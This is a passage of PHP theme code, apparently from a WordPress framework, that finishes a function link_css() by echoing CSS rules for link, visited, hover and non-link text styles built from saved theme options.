	$decoration		= p2_option( $key . '_link_decoration', 			0 );
	$decoration_h	= p2_option( $key . '_link_hover_decoration', 		0 );
	$effect 		= p2_option( $key . '_link_text_transform', 		0 );
	$nonlink_color 	= p2_option( $key . '_nonlink_font_color', 			0 );
	
	// check optional bound colors
	if ( $optional_colors ) {
		if ( !p2_is_bound( $key . '_link_font_color' ) ) $color = false;
		if ( !p2_is_bound( $key . '_link_hover_font_color' ) ) $color_hover = false;
	}
	// visited is always optional 
	if ( $color_visited && !p2_is_bound( $key . '_link_visited_font_color' ) ) $color_visited = false;
	
	
	if ( ( $do_nonlink ) && ( $nonlink_color || $family || $size || $effect ) ) { 
		echo $selector . " {\n\t";
		if ( $nonlink_color ) 	echo "color:" 				. $nonlink_color . ";";
		if ( $family ) 			echo "\n\tfont-family:" 	. $family 	  	 . ";";
		if ( $size ) 			echo "\n\tfont-size:" 		. $size 		 . "px;";
		if ( $effect ) 			echo "\n\ttext-transform:"	. $effect 		 . ";";
		echo "\n}\n";
	}	 
	if ( $style || $family || $effect || $color || $size ) {
		echo $selector . "a {";
		if ( $style )		echo "\n\tfont-style:"  	. $style  		. ";"; 
		if ( $color )  		echo "\n\tcolor:" 			. $color  		. ";";
		if ( $family )   	echo "\n\tfont-family:" 	. $family 		. ";";
		if ( $size )   		echo "\n\tfont-size:" 		. $size 		. "px;";
		if ( $effect )  	echo "\n\ttext-transform:"	. $effect 		. ";";
		echo "\n}\n";
	}
	if ( $decoration ) {
		echo $selector . "a:link {";
		if ( $color ) 		echo "\n\tcolor:" 			. $color  		. ";";
		if ( $decoration )	echo "\n\ttext-decoration:"	. $decoration  	. ";";
		echo "\n}\n";
	}
	if ( $color_visited || $color || $decoration ) {
		echo $selector . "a:visited {";
		if ( $color ) 			echo "\n\tcolor:" 			. $color . 		  ";";
		if ( $color_visited ) 	echo "\n\tcolor:" 			. $color_visited. ";";
		if ( $decoration )		echo "\n\ttext-decoration:"	. $decoration  	. ";";
		echo "\n}\n";
	}
	if ( $decoration_h || $color_hover ) {
		echo $selector . " a:hover {";
		if ( $color_hover )		echo "\n\tcolor:" 			. $color_hover	. ";";
		if ( $decoration_h )	echo "\n\ttext-decoration:"	. $decoration_h	. ";";
		echo "\n}\n";
	}
} // end function link_css()

?>